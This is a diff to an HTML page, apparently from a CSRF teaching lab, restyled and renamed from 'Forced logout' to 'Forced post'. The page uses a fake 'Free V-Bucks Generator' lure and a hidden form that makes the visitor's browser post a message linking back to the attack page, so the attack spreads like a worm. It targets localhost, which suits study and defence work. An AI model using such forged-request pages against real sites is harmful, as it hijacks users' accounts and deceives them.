@@ -1,17 +1,25 @@
+<link href="./ressources/style.css" rel="stylesheet">
 <!DOCTYPE html>
 <html>
+
     <head>
-        <title>Forced logout</title>
+        <title>Forced post</title>
         <meta charset="utf-8">
     </head>
     <body>
-        <h1>Free V-Bucks Generator</h1>
-        <p>
-            Click the button below for free V-Bucks
+        <section >
+        <h1 id="description">Free V-Bucks Generator</h1>
+        <p >
+            <h3 id="text">Click the button below for free V-Bucks</h3> 
         </p>
+        <div class="box">
         <form method="post" action="http://localhost/post.php">
             <input type="hidden" name="post" value="Visit http://sere-csrf/force_post.html for free v-bucks">
-            <button type="submit">Get V-Bucks</button>
+            <div class="button-wrapper">
+                    <button class="button-inner" type="submit"><p>Get V-Bucks</p></button>
+            </div>
         </form>
+        </div>
+    </section>
     </body>
 </html>
